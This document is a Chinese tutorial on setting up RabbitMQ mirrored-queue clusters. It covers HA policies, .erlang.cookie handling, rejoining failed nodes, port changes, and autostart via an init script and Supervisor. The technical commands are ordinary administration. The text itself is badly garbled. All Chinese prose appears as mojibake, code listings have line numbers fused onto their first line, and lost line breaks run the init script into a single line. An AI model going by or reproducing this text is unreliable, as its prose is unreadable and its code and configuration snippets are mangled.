æ™®é€šé›†ç¾¤çš„æ­å»ºï¼Œä½†å¹¶ä¸èƒ½ä¿è¯é˜Ÿåˆ—çš„é«˜å¯ç”¨æ€§ï¼Œå°½ç®¡äº¤æ¢æœºã€é˜Ÿåˆ—ã€ç»‘å®šè¿™äº›å¯ä»¥å¤åˆ¶åˆ°é›†ç¾¤é‡Œçš„ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä½†æ˜¯é˜Ÿåˆ—å†…å®¹ï¼ˆæ¶ˆæ¯ï¼‰ä¸ä¼šå¤åˆ¶ã€‚è™½ç„¶æ™®é€šé›†ç¾¤è§£å†³å¯ä»¥ä¸€é¡¹ç›®ç»„çš„èŠ‚ç‚¹å‹åŠ›ï¼Œä½†é˜Ÿåˆ—èŠ‚ç‚¹ï¼ˆç£ç›˜èŠ‚ç‚¹ï¼‰å®•æœºä¼šç›´æ¥å¯¼è‡´å…¶ä»–èŠ‚ç‚¹çš„é˜Ÿåˆ—ï¼ˆå†…å­˜èŠ‚ç‚¹ï¼‰æ— æ³•ä½¿ç”¨ï¼Œåªèƒ½ç­‰å¾…é˜Ÿåˆ—èŠ‚ç‚¹ï¼ˆç£ç›˜èŠ‚ç‚¹ï¼‰é‡å¯ï¼Œæ‰€ä»¥è¦æƒ³åœ¨é˜Ÿåˆ—èŠ‚ç‚¹ï¼ˆç£ç›˜èŠ‚ç‚¹ï¼‰å®•æœºæˆ–æ•…éšœä¹Ÿèƒ½æ­£å¸¸åº”ç”¨ï¼Œå°±è¦å¤åˆ¶é˜Ÿåˆ—å†…å®¹ï¼ˆæ¶ˆæ¯ï¼‰åˆ°é›†ç¾¤é‡Œçš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå› æ­¤å¿…é¡»è¦åˆ›å»ºé•œåƒé˜Ÿåˆ—ã€‚é•œåƒé˜Ÿåˆ—æ˜¯åŸºäºæ™®é€šçš„é›†ç¾¤æ¨¡å¼çš„ï¼Œç„¶åå†æ·»åŠ ä¸€äº›ç­–ç•¥ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—å…ˆé…ç½®æ™®é€šé›†ç¾¤ï¼Œç„¶åæ‰èƒ½è®¾ç½®é•œåƒé˜Ÿåˆ—ã€‚è®¾ç½®é•œåƒé˜Ÿåˆ—å¯ä»¥åœ¨ RabbitMQ çš„ Web æ§åˆ¶å°è¿›è¡Œï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤ï¼Œè¿™é‡Œä»‹ç»æ˜¯å…¶ä¸­çš„ Web æ§åˆ¶å°è®¾ç½®æ–¹å¼ã€‚ åˆ›å»ºç­–ç•¥åœ¨èŠ‚ç‚¹ä¸€çš„ Web æ§åˆ¶å°ä¸Šåˆ›å»ºç­–ç•¥ï¼š ç‚¹å‡» Admin èœå• â€“&gt; å³ä¾§çš„ Policies é€‰é¡¹ æŒ‰ç…§å›¾ä¸­çš„å†…å®¹æ ¹æ®è‡ªå·±çš„éœ€æ±‚å¡«å†™ Nameï¼šç­–ç•¥åç§° Patternï¼šåŒ¹é…çš„è§„åˆ™ï¼Œ^a è¡¨ç¤ºåŒ¹é… a å¼€å¤´çš„é˜Ÿåˆ—ï¼Œå¦‚æœæ˜¯åŒ¹é…æ‰€æœ‰çš„é˜Ÿåˆ—ï¼Œé‚£å°±æ˜¯ ^. Definitionï¼šä½¿ç”¨ ha-mode æ¨¡å¼ä¸­çš„ allï¼Œä¹Ÿå°±æ˜¯åŒæ­¥æ‰€æœ‰åŒ¹é…çš„é˜Ÿåˆ— ç‚¹å‡»å·¦ä¾§æœ€ä¸‹è¾¹çš„ Add/update a policy æŒ‰é’®æ–°å¢ç­–ç•¥ æ­¤æ—¶åˆ†åˆ«ç™»å½•èŠ‚ç‚¹äºŒã€èŠ‚ç‚¹ä¸‰çš„ Web æ§åˆ¶å°ï¼ŒåŒæ ·å¯ä»¥çœ‹åˆ°åˆšæ·»åŠ çš„è¿™ä¸ªç­–ç•¥ åˆ›å»ºé˜Ÿåˆ—åœ¨èŠ‚ç‚¹ä¸€çš„ Web æ§åˆ¶å°ä¸Šåˆ›å»ºé˜Ÿåˆ—ï¼š ç‚¹å‡» Queues èœå• è¾“å…¥ Name å’Œ Arguments` å‚æ•°çš„å€¼ï¼Œåˆ«çš„å‚æ•°é»˜è®¤å³å¯ Nameï¼šé˜Ÿåˆ—åç§°Durabilityï¼šé˜Ÿåˆ—æ˜¯å¦æŒä¹…åŒ–Nodeï¼šæ¶ˆæ¯é˜Ÿåˆ—çš„èŠ‚ç‚¹Auto deleteï¼šæ˜¯å¦è‡ªåŠ¨åˆ é™¤Argumentsï¼šä½¿ç”¨çš„ç­–ç•¥ç±»å‹ ç‚¹å‡»å·¦ä¾§ä¸‹è¾¹çš„ Add a new queue æŒ‰é’®æ–°å¢é˜Ÿåˆ—ï¼Œå°†é¼ æ ‡æŒ‡å‘ +2 å¯ä»¥æ˜¾ç¤ºå‡ºå¦å¤–ä¸¤å°èŠ‚ç‚¹ åˆ›å»ºæ¶ˆæ¯ ç‚¹å‡» ab é˜Ÿåˆ—æŒ‰é’®ï¼Œæ‹–åŠ¨æ»šåŠ¨æ¡ å¡«å†™ç›¸å…³å†…å®¹ 2-Persistentï¼šè¡¨ç¤ºæŒä¹…åŒ–Headersï¼šéšä¾¿å¡«å†™å³å¯Propertiesï¼šç‚¹å‡»é—®å·ï¼Œé€‰æ‹©ä¸€ä¸ªæ¶ˆæ¯ ID å·Payloadï¼šæ¶ˆæ¯å†…å®¹ ç‚¹å‡» Publish message æŒ‰é’®æ–°å¢æ¶ˆæ¯ï¼Œå¯å‘ç° ab é˜Ÿåˆ—çš„ Ready å’Œ Total ä¸­å¤šäº†ä¸€æ¡æ¶ˆæ¯è®°å½• éªŒè¯é«˜å¯ç”¨æ€§ å°†èŠ‚ç‚¹ä¸€çš„ RabbitMQ æœåŠ¡å…³é—­ï¼Œå†é€šè¿‡èŠ‚ç‚¹ä¸€å’ŒèŠ‚ç‚¹äºŒï¼ŒæŸ¥çœ‹æ¶ˆæ¯è®°å½•æ˜¯å¦è¿˜å­˜åœ¨ï¼Œç»“æœå¯ä»¥çœ‹åˆ°åœ¨å…¶ä»–èŠ‚ç‚¹çš„æ¶ˆæ¯è®°å½•æ˜¯å­˜åœ¨çš„ å†å°†èŠ‚ç‚¹äºŒçš„ RabbitMQ æœåŠ¡å…³é—­ï¼Œé€šè¿‡èŠ‚ç‚¹ä¸‰æŸ¥çœ‹æ¶ˆæ¯è®°å½•æ˜¯å¦è¿˜å­˜åœ¨ï¼Œç»“æœå¯ä»¥çœ‹åˆ° ab é˜Ÿåˆ—å’Œæ¶ˆæ¯è®°å½•è¿˜æ˜¯å­˜åœ¨çš„ï¼Œåªæ˜¯å˜æˆäº†åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ å°†èŠ‚ç‚¹ä¸€å’ŒèŠ‚ç‚¹äºŒçš„ RabbitMQ æœåŠ¡é‡å¯ï¼Œä»ä¸­å¯ä»¥çœ‹åˆ° ab é˜Ÿåˆ—åé¢ +2 å˜æˆäº†çº¢è‰²ï¼Œé¼ æ ‡æŒ‡ä¸Šå»æ˜¾ç¤ºé•œåƒæ— æ³•åŒæ­¥ é‡‡å–çš„è§£å†³åŠæ³•æ˜¯é€‰æ‹©åœ¨èŠ‚ç‚¹äºŒä¸Šæ‰§è¡ŒåŒæ­¥å‘½ä»¤ 12345# è¿›å…¥èŠ‚ç‚¹ä¸€çš„å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# åŒæ­¥ç‰¹å®šçš„é˜Ÿåˆ—# ./rabbitmqctl sync_queue ab åŒæ­¥å®Œæˆåï¼Œ+2 æ ‡è¯†åˆå˜æˆäº†è“è‰²ï¼Œè¿™æ ·å°±æµ‹è¯•äº† RabbitMQ é›†ç¾¤çš„é«˜å¯ç”¨æ€§ï¼Œè¯´æ˜é•œåƒé›†ç¾¤é…ç½®æˆåŠŸã€‚ FAQ.erlang.cookie è§£æƒ‘.erlang.cookie æ˜¯ Erlang å®ç°åˆ†å¸ƒå¼é›†ç¾¤çš„å¿…è¦æ–‡ä»¶ï¼ŒErlang åˆ†å¸ƒå¼é›†ç¾¤è¦æ±‚æ¯ä¸ªèŠ‚ç‚¹ä¸Šéƒ½è¦æœ‰ç›¸åŒçš„ .erlang.cookie æ–‡ä»¶ï¼ŒåŒæ—¶ä¿è¯æ–‡ä»¶çš„æƒé™æ˜¯ 400ã€‚åœ¨æ­å»º RabbitMQ é›†ç¾¤çš„æ—¶å€™å¾€å¾€ä¼šå› ä¸º .erlang.cookie è€ŒæŠ¥å„ç§é”™è¯¯ï¼Œå®˜æ–¹åœ¨ä»‹ç»é›†ç¾¤çš„æ–‡æ¡£ä¸­æåˆ°è¿‡ .erlang.cookie ä¸€èˆ¬ä¼šå­˜åœ¨è¿™ä¸¤ä¸ªè·¯å¾„ï¼šç¬¬ä¸€ä¸ªæ˜¯ ${home}/.erlang.cookieï¼Œç¬¬äºŒä¸ªå°±æ˜¯ /var/lib/rabbitmq/.erlang.cookieï¼Œå…·ä½“è¯´æ˜å¦‚ä¸‹ï¼š å¦‚æœ RPM ç­‰å®‰è£…åŒ…æ–¹å¼è¿›è¡Œå®‰è£…çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶ä¼šåœ¨ /var/lib/rabbitmq ç›®å½•ä¸‹ï¼Œå®Œæ•´è·¯å¾„ä¸º /var/lib/rabbitmq/.erlang.cookie å¦‚æœä½¿ç”¨è§£å‹ç¼©æ–¹å¼å®‰è£…éƒ¨ç½² RabbitMQï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶ä¼šåœ¨ ${home} ç›®å½•ä¸‹ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·çš„ Home ç›®å½•ä¸‹ï¼Œå®Œæ•´è·¯å¾„ä¸º ${home}/.erlang.cookie é€šè¿‡ RabbitMQ çš„å¯åŠ¨æ—¥å¿—ï¼Œå¯ä»¥æŸ¥çœ‹å…¶ Home ç›®å½•æ˜¯å“ªé‡Œï¼Œå°±å¯ä»¥çŸ¥é“ .erlang.cookie å­˜æ”¾åœ¨å“ªé‡Œï¼Œä»¥åŠ mnesia æ•°æ®åº“ä¿¡æ¯å­˜åœ¨å“ªé‡Œ 12345678# RPMåŒ…å®‰è£…æ–¹å¼node : rabbit@he10home dir : /var/lib/rabbitmqconfig file(s) : /etc/rabbitmq/rabbitmq.config (not found)cookie hash : qhOGp9TtH4Rn+BekiYXxIg==log : /var/log/rabbitmq/rabbit@he07.logsasl log : /var/log/rabbitmq/rabbit@he07-sasl.logdatabase dir : /var/lib/rabbitmq/mnesia/rabbit@he07 12345678# è§£å‹ç¼©å®‰è£…æ–¹å¼ï¼ˆè¿™é‡Œä½¿ç”¨Rootç”¨æˆ·å¯åŠ¨ï¼‰node : rabbit@he10home dir : /rootconfig file(s) : /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config (not found)cookie hash : 063Gh+RyPjHRzyuSPf9wWA==log : /usr/local/rabbitmq/var/log/rabbitmq/rabbit@he10.logsasl log : /usr/local/rabbitmq/var/log/rabbitmq/rabbit@he10-sasl.logdatabase dir : /usr/local/rabbitmq/var/lib/rabbitmq/mnesia/rabbit@he10 é‡æ–°å°†èŠ‚ç‚¹åŠ å…¥é›†ç¾¤è¿™é‡Œå‡è®¾ç”±äºå„ç§åŸå› ï¼ˆä¾‹å¦‚æ–­ç”µé‡å¯ã€èŠ‚ç‚¹å®•æœºé‡å¯ï¼‰ï¼ŒèŠ‚ç‚¹äºŒæ— æ³•æˆåŠŸåŠ å…¥åˆ°é›†ç¾¤ï¼Œé‚£ä¹ˆå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥è§£å†³ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œä»¥ä¸‹æ“ä½œä¼šåˆ é™¤èŠ‚ç‚¹äºŒçš„å…ƒæ•°æ®ï¼ˆè™šæ‹Ÿæœºã€ç”¨æˆ·ã€è§’è‰²ã€æƒé™ã€å·²æŒä¹…åŒ–çš„æ¶ˆæ¯ç­‰ï¼‰ï¼Œå› æ­¤å½“èŠ‚ç‚¹äºŒæˆåŠŸåŠ å…¥é›†ç¾¤åï¼Œå¿…é¡»é‡æ–°é…ç½®èŠ‚ç‚¹äºŒçš„è™šæ‹Ÿæœºã€ç”¨æˆ·ã€è§’è‰²ã€æƒé™ç­‰ï¼Œå¦åˆ™ RabbitMQ å®¢æˆ·ç«¯å°†æ— æ³•è¿æ¥èŠ‚ç‚¹äºŒã€‚ é¦–å…ˆåœ¨èŠ‚ç‚¹ä¸€é‡Œï¼Œå°†èŠ‚ç‚¹äºŒç§»å‡ºé›†ç¾¤ 12345# è¿›å…¥èŠ‚ç‚¹ä¸€çš„å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# å°†èŠ‚ç‚¹äºŒç§»å‡ºé›†ç¾¤# ./rabbitmqctl -n rabbit@rabbitmq1 forget_cluster_node rabbit@rabbitmq2 ç„¶åé‡ç½®èŠ‚ç‚¹äºŒçš„å…ƒæ•°æ®ã€é›†ç¾¤é…ç½®ç­‰ä¿¡æ¯ï¼Œå…¶ä¸­ä¼šåˆ é™¤è™šæ‹Ÿæœºã€ç”¨æˆ·ã€è§’è‰²ã€æƒé™ã€å·²æŒä¹…åŒ–çš„æ¶ˆæ¯ç­‰å…ƒæ•°æ® 1234567891011121314151617# è¿›å…¥èŠ‚ç‚¹äºŒçš„å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# åå°å¯åŠ¨èŠ‚ç‚¹äºŒçš„RabbitMQæœåŠ¡# ./rabbitmq-server -detached# åœæ­¢èŠ‚ç‚¹äºŒçš„RabbitMQçš„æœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# é‡ç½®èŠ‚ç‚¹äºŒçš„å…ƒæ•°æ®ã€é›†ç¾¤é…ç½®ç­‰ä¿¡æ¯# ./rabbitmqctl -n rabbit@rabbitmq2 reset# é‡æ–°å°†èŠ‚ç‚¹äºŒåŠ å…¥åˆ°é›†ç¾¤# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# å¯åŠ¨èŠ‚ç‚¹äºŒçš„RabbitMQæœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 start_app å¦‚æœèŠ‚ç‚¹äºŒä»ç„¶æ— æ³•åŠ å…¥é›†ç¾¤ï¼Œå¯ä»¥ç›´æ¥åˆ é™¤èŠ‚ç‚¹äºŒçš„æ‰€æœ‰æ•°æ®åº“æ–‡ä»¶ï¼Œç„¶åé‡å¯èŠ‚ç‚¹äºŒçš„ RabbitMQ æœåŠ¡ï¼Œæœ€åé‡æ–°å°†èŠ‚ç‚¹äºŒåŠ å…¥åˆ°é›†ç¾¤ 1234567891011121314151617181920212223# è¿›å…¥èŠ‚ç‚¹äºŒçš„å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# å½»åº•å…³é—­èŠ‚ç‚¹äºŒçš„RabbitMQæœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 stop# åˆ é™¤èŠ‚ç‚¹äºŒçš„æ•°æ®æ–‡ä»¶# rm -rf /usr/local/rabbitmq/var/lib/rabbitmq/mnesia/*# åå°å¯åŠ¨èŠ‚ç‚¹äºŒçš„RabbitMQæœåŠ¡# ./rabbitmq-server -detached# åœæ­¢èŠ‚ç‚¹äºŒçš„RabbitMQçš„æœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# é‡ç½®èŠ‚ç‚¹äºŒçš„å…ƒæ•°æ®ã€é›†ç¾¤é…ç½®ç­‰ä¿¡æ¯# ./rabbitmqctl -n rabbit@rabbitmq2 reset# é‡æ–°å°†èŠ‚ç‚¹äºŒåŠ å…¥åˆ°é›†ç¾¤# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# å¯åŠ¨èŠ‚ç‚¹äºŒçš„RabbitMQæœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 start_app å¼ºåˆ¶é‡ç½®èŠ‚ç‚¹ï¼Œforce_reset å‘½ä»¤å’Œ reset çš„åŒºåˆ«æ˜¯æ— æ¡ä»¶é‡ç½®èŠ‚ç‚¹ï¼Œä¸ç®¡å½“å‰ç®¡ç†æ•°æ®åº“çŠ¶æ€ä»¥åŠé›†ç¾¤çš„é…ç½®ï¼Œå¦‚æœæ•°æ®åº“æˆ–è€…é›†ç¾¤é…ç½®å‘ç”Ÿé”™è¯¯æ‰ä½¿ç”¨è¿™ä¸ªæœ€åçš„æ‰‹æ®µ 1# ./rabbitmqctl force_reset RabbitMQ æ›´æ”¹é»˜è®¤ç«¯å£RabbitMQ é»˜è®¤å ç”¨ 4369ã€5672ã€15672ã€25672 é»˜è®¤ç«¯å£å·ï¼Œæ›´æ”¹é»˜è®¤ç«¯å£çš„æ–¹æ³•å¦‚ä¸‹ï¼š æ›´æ”¹ 15672 ç«¯å£ï¼Œé…ç½®æ–‡ä»¶è·¯å¾„ï¼š/usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config 12345678910111213[ {rabbitmq_management, [ {listener, [ {port, 15672}, {ip, "0.0.0.0"}, {ssl, false} ] } ] }]. æ›´æ”¹ 5672ã€25672 ç«¯å£ï¼Œé…ç½®æ–‡ä»¶è·¯å¾„ï¼š/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf 12NODE_PORT=5673DIST_PORT=25673 æ›´æ”¹ 4369 ç«¯å£ï¼Œé…ç½®æ–‡ä»¶è·¯å¾„ï¼š/etc/profileï¼Œå•æœºå¯ä»¥å¤šä¸ª RabbitMQ èŠ‚ç‚¹å…±ç”¨åŒä¸€ä¸ª ERL_EPMD_PORT ç«¯å£ 1export ERL_EPMD_PORT=4363 RabbitMQ é›†ç¾¤å¼€æœºè‡ªå¯åŠ¨ - æ–¹æ¡ˆä¸€å°†é›†ç¾¤å„èŠ‚ç‚¹çš„ RabbitMQ æœåŠ¡æ‰˜ç®¡ç»™ Systemd ç®¡ç†ï¼Œè¿™é‡Œä»¥èŠ‚ç‚¹ä¸€ä¸ºä¾‹å­ï¼Œè‹¥å…¶ä»–èŠ‚ç‚¹çš„ç«¯å£å·ä¸ç›¸åŒï¼Œé»˜è®¤æƒ…å†µä¸‹åªéœ€æ›´æ”¹æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬ä¸­å¯¹åº”çš„ç«¯å£å·å³å¯ï¼Œè¯¥è„šæœ¬æ”¯æŒå•æœºæ­å»º RabbitMQ é›†ç¾¤ã€‚ 1234567891011121314151617# åˆ›å»ºæœåŠ¡è‡ªå¯åŠ¨è„šæœ¬# touch /etc/init.d/rabbitmq-cluster-15672# æ›´æ”¹æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬ï¼Œå†™å…¥åé¢ç»™å‡ºçš„è„šæœ¬å†…å®¹# vim /etc/init.d/rabbitmq-cluster-15672# æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬æˆæƒ# chmod u+x /etc/init.d/rabbitmq-cluster-15672# å¼€æœºè‡ªå¯åŠ¨# chkconfig rabbitmq-cluster-15672 on# æŸ¥çœ‹å¼€æœºè‡ªå¯åŠ¨åˆ—è¡¨# chkconfig --list# å…³é—­å¼€æœºè‡ªå¯åŠ¨# chkconfig rabbitmq-cluster-15672 off RabbitMQ é›†ç¾¤å„èŠ‚ç‚¹çš„æœåŠ¡ç®¡ç† 1234567891011# å…³é—­æœåŠ¡# systemctl stop rabbitmq-cluster-15672# å¯åŠ¨æœåŠ¡# systemctl start rabbitmq-cluster-15672# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# systemctl status rabbitmq-cluster-15672# é‡å¯æœåŠ¡# systemctl restart rabbitmq-cluster-15672 â˜…å±•å¼€æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬çš„å®Œæ•´å†…å®¹â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#!/bin/sh## rabbitmq-cluster-15672 RabbitMQ broker## chkconfig: - 80 05# description: Enable AMQP service provided by RabbitMQ#### BEGIN INIT INFO# Provides: rabbitmq-cluster-15672# Required-Start: $remote_fs $network# Required-Stop: $remote_fs $network# Description: RabbitMQ broker# Short-Description: Enable AMQP service provided by RabbitMQ broker### END INIT INFO# Source function library.. /etc/init.d/functionsexport HOME=/home/rabbitmqPATH=/sbin:/usr/sbin:/bin:/usr/binUSER=rabbitmqNAME=rabbitmq-serverMQ_HOME=/usr/local/rabbitmqDAEMON=${MQ_HOME}/sbin/${NAME}CONTROL=${MQ_HOME}/sbin/rabbitmqctlROTATE_SUFFIX=DESC=rabbitmq-cluster-15672MAX_OPEN_FILES=1048576ulimit -n $MAX_OPEN_FILESSTART_PROG="daemon"PID_FILE=/var/run/rabbitmq/pid-15672LOCK_FILE=/var/lock/subsys/$NAME-15672INIT_LOG_DIR=${MQ_HOME}/var/log/rabbitmqtest -x $DAEMON || exit 0test -x $CONTROL || exit 0RETVAL=0set -e[ -f /etc/default/${NAME} ] &amp;&amp; . /etc/default/${NAME}ensure_pid_dir () { PID_DIR=`dirname ${PID_FILE}` if [ ! -d ${PID_DIR} ] ; then mkdir -p ${PID_DIR} chown -R ${USER}:${USER} ${PID_DIR} chmod 755 ${PID_DIR} fi}remove_pid () { rm -f ${PID_FILE} rmdir `dirname ${PID_FILE}` || :}start_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then echo RabbitMQ is currently running else RETVAL=0 ensure_pid_dir set +e RABBITMQ_PID_FILE=$PID_FILE $START_PROG $DAEMON \\ &gt; "${INIT_LOG_DIR}/startup_log" \\ 2&gt; "${INIT_LOG_DIR}/startup_err" \\ 0&lt;&amp;- &amp; $CONTROL wait $PID_FILE &gt;/dev/null 2&gt;&amp;1 RETVAL=$? set -e case "$RETVAL" in 0) echo SUCCESS if [ -n "$LOCK_FILE" ] ; then touch $LOCK_FILE fi ;; *) remove_pid echo FAILED - check ${INIT_LOG_DIR}/startup_\\{log, _err\\} RETVAL=1 ;; esac fi}stop_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then set +e $CONTROL stop ${PID_FILE} &gt; ${INIT_LOG_DIR}/shutdown_log 2&gt; ${INIT_LOG_DIR}/shutdown_err RETVAL=$? set -e if [ $RETVAL = 0 ] ; then remove_pid if [ -n "$LOCK_FILE" ] ; then rm -f $LOCK_FILE fi else echo FAILED - check ${INIT_LOG_DIR}/shutdown_log, _err fi else echo RabbitMQ is not running RETVAL=0 fi}status_rabbitmq() { set +e if [ "$1" != "quiet" ] ; then $CONTROL status 2&gt;&amp;1 else $CONTROL status &gt; /dev/null 2&gt;&amp;1 fi if [ $? != 0 ] ; then RETVAL=3 fi set -e}rotate_logs_rabbitmq() { set +e $CONTROL rotate_logs ${ROTATE_SUFFIX} if [ $? != 0 ] ; then RETVAL=1 fi set -e}restart_running_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then restart_rabbitmq else echo RabbitMQ is not runnning RETVAL=0 fi}restart_rabbitmq() { stop_rabbitmq start_rabbitmq}case "$1" in start) echo -n "Starting $DESC: " start_rabbitmq echo "$NAME." ;; stop) echo -n "Stopping $DESC: " stop_rabbitmq echo "$NAME." ;; status) status_rabbitmq ;; rotate-logs) echo -n "Rotating log files for $DESC: " rotate_logs_rabbitmq ;; force-reload|reload|restart) echo -n "Restarting $DESC: " restart_rabbitmq echo "$NAME." ;; try-restart) echo -n "Restarting $DESC: " restart_running_rabbitmq echo "$NAME." ;; *) echo "Usage: $0 {start|stop|status|rotate-logs|restart|condrestart|try-restart|reload|force-reload}" &gt;&amp;2 RETVAL=1 ;;esacexit $RETVAL RabbitMQ é›†ç¾¤å¼€æœºè‡ªå¯åŠ¨-æ–¹æ¡ˆäºŒä¸¥æ ¼æ¥è¯´ RabbitMQ å¹¶ä¸é€‚ç”¨ä½¿ç”¨ Supervior æ¥ç®¡ç†æœåŠ¡ï¼Œå› ä¸ºå½“æ‰‹åŠ¨ Kill æ‰ RabbitMQ çš„è¿›ç¨‹æ—¶ï¼ŒSupervior æ— æ³•æ­£å¸¸é‡å¯ RabbitMQ çš„è¿›ç¨‹ï¼Œå…·ä½“åŸå› å¯ä»¥çœ‹è¿™é‡Œï¼Œä½†è‹¥åªæ˜¯ç®€å•å®ç° RabbitMQ å¼€æœºè‡ªå¯åŠ¨ï¼ŒSupervior æ— ç–‘æ˜¯å¯ä»¥èƒœä»»çš„ã€‚ ä½¿ç”¨ Supervior æ‰˜ç®¡ç®¡ç† RabbitMQ çš„æœåŠ¡ï¼Œä»¥èŠ‚ç‚¹ä¸€ä¸ºä¾‹ç»™å‡ºä¸‹è¿°é…ç½®ç¤ºä¾‹ï¼Œå…¶ä»–èŠ‚ç‚¹åªéœ€æ›´æ”¹å¯¹åº”çš„ç«¯å£å·å³å¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œå¿…é¡»æŒ‡å®š environment=HOME=/home/rabbitmqï¼Œå¦åˆ™ RabbitMQ ä¼šæ‰¾ä¸åˆ° .erlang.cookie è€Œå¯¼è‡´å¯åŠ¨å¤±è´¥ 12345678910111213141516[program:rabbitmq]environment=HOME=/home/rabbitmqdirectory=/usr/local/rabbitmqcommand=/usr/local/rabbitmq/sbin/rabbitmq-serveruser=rabbitmqnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)sstdout_logfile_backups=5stdout_logfile_maxbytes=10MBstdout_logfile=/var/log/supervisor/rabbitmq.logstderr_logfile_backups=5stderr_logfile_maxbytes=10MBstderr_logfile=/var/log/supervisor/rabbitmq-error.log ä»¥èŠ‚ç‚¹ä¸€ä¸ºä¾‹é€šè¿‡ Supervisor ç®¡ç† RabbitMQ æœåŠ¡ï¼Œå…¶ä»–èŠ‚ç‚¹ä¸å†ç´¯è¿° 1234567891011# å…³é—­æœåŠ¡# supervisorctl stop rabbitmq# å¯åŠ¨æœåŠ¡# supervisorctl start rabbitmq# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# supervisorctl status rabbitmq# é‡å¯æœåŠ¡# supervisorctl restart rabbitmq RabbitMQ æ— æ³•æ“ä½œé›†ç¾¤èŠ‚ç‚¹è‹¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å‡ºç°ä¸‹è¿°çš„é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯å½“å‰æ‰§è¡Œæ“ä½œçš„ç”¨æˆ·çš„å®¶ç›®å½•ä¸‹çš„ .erlang.cookie ä¸ é›†ç¾¤èŠ‚ç‚¹çš„ .erlang.cookie ä¸ä¸€è‡´å¯¼è‡´ã€‚è§£å†³åŠæ³•æ˜¯é›†ç¾¤èŠ‚ç‚¹æ˜¯ä»¥å“ªä¸ªç”¨æˆ·å¯åŠ¨çš„ï¼Œå°±åˆ‡æ¢åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼Œä¾‹å¦‚ su rabbitmq ï¼Œç„¶åå†æ‰§è¡Œé›†ç¾¤æ“ä½œå‘½ä»¤ã€‚ 12# æŸ¥çœ‹é›†ç¾¤çŠ¶æ€# ./rabbitmqctl cluster_status æ‰§è¡Œé›†ç¾¤çŠ¶æ€æŸ¥çœ‹å‘½ä»¤ï¼Œå‡ºç°ä»¥ä¸‹é”™è¯¯ä¿¡æ¯ 12345678910111213141516171819202122232425262728293031Error: unable to perform an operation on node \'rabbit2@rabbitmq2\'. Please see diagnostics information and suggestions below.Most common reasons for this are: * Target node is unreachable (e.g. due to hostname resolution, TCP connection or firewall issues) * CLI tool fails to authenticate with the server (e.g. due to CLI tool\'s Erlang cookie not matching that of the server) * Target node is not runningIn addition to the diagnostics info below: * See the CLI, clustering and networking guides on https://rabbitmq.com/documentation.html to learn more * Consult server logs on node rabbit2@rabbitmq2 * If target node is configured to use long node names, don\'t forget to use --longnames with CLI toolsDIAGNOSTICS===========attempted to contact: [rabbit2@rabbitmq2]rabbit2@rabbitmq2: * connected to epmd (port 4369) on rabbitmq2 * epmd reports node \'rabbit2\' uses port 25674 for inter-node and CLI tool traffic * TCP connection succeeded but Erlang distribution failed * Authentication failed (rejected by the remote node), please check the Erlang cookieCurrent node details: * node name: \'rabbitmqcli-7936-rabbit2@rabbitmq2\' * effective user\'s home directory: /home/centos * Erlang cookie hash: 5hmDFFQNoU5sdfrafENxAg== RabbitMQ é›†ç¾¤é…ç½®æ–‡ä»¶æ¦‚è¿°è¿™é‡Œä»¥èŠ‚ç‚¹ä¸€ä¸ºä¾‹ï¼Œå„ä¸ªé…ç½®æ–‡ä»¶çš„è·¯å¾„å¦‚ä¸‹ï¼Œå…¶ä»–èŠ‚ç‚¹ä¸å†ç´¯è¿° 123456å®‰è£…ç›®å½•ï¼š/usr/local/rabbitmqæ—¥å¿—ç›®å½•ï¼š/usr/local/rabbitmq/var/log/rabbitmqæ•°æ®ç›®å½•ï¼š/usr/local/rabbitmq/var/lib/rabbitmq/mnesiaé…ç½®æ–‡ä»¶ï¼š/usr/local/rabbitmq/etc/rabbitmq/rabbitmq.configç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ï¼š/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.confæœåŠ¡è‡ªå¯åŠ¨è„šæœ¬ï¼š/etc/init.d/rabbitmq-cluster-15672 å‚è€ƒåšå®¢ RabbitMQ 